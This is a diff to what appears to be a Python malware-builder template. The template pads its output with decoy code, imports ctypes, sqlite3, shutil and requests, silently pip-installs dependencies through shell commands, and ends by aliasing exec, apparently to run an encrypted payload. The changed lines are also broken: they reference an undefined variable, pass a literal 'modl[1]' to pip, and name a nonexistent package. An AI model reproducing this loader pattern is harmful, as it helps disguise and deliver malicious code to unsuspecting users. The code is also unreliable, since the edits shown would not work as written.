@@ -13,6 +13,7 @@ try:
 except:
     subprocess.run(f'python -m pip install cryptography', shell=True, check=True)
 
+
 from cryptography.fernet import Fernet
 
 # Constants and configurations
@@ -114,18 +115,29 @@ import zlib
 import base64
 {all_fake_code}
 from sys import executable, stderr
+
+
 try:
-    from cryptography.fernet import Fernet
+    import cryptography
 except ImportError:
     subprocess.run('python -m pip install cryptography', shell=True)
     from cryptography.fernet import Fernet
 
 import subprocess
+from importlib import import_module
+
+
 requirements = [
     ["requests", "requests"],
     ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
-
+for modl in requirements:
+    try:
+        import_module(module[0])
+    except:
+        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
+        time.sleep(3)
+        
 import requests
 
 from cryptography.fernet import Fernet as {a}
@@ -156,13 +168,15 @@ from sys import executable, stderr
 {all_fake_code}
 import ctypes;import base64,subprocess,sqlite3,json,shutil
 import time
+from importlib import import_module
 
 requirements = [
     ["requests", "requests"],
     ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
 for modl in requirements:
-    try: __import__(modl[0])
+    try:
+        import_module(module[0])
     except:
         subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
         time.sleep(3)
@@ -173,18 +187,20 @@ from urllib.request import Request, urlopen
 try:
     from cryptography.fernet import Fernet
 except:
-    subprocess.run("python -m pip install pycryptodomex")
+    subprocess.run("python -m pip install cryptography")
 
 try:
     from cryptography.fernet import Fernet
 except:
-    subprocess.run("python -m pip install pycryptodomex", shell=True)
+    subprocess.run("python -m pip install cryptodomex", shell=True)
 
 try:
     import requests
 except:
     subprocess.run("python -m pip install requests", shell=True)
 
+import Cryptodome
+from Cryptodome import Cipher
 import requests
 {all_fake_code}
 {e} = exec
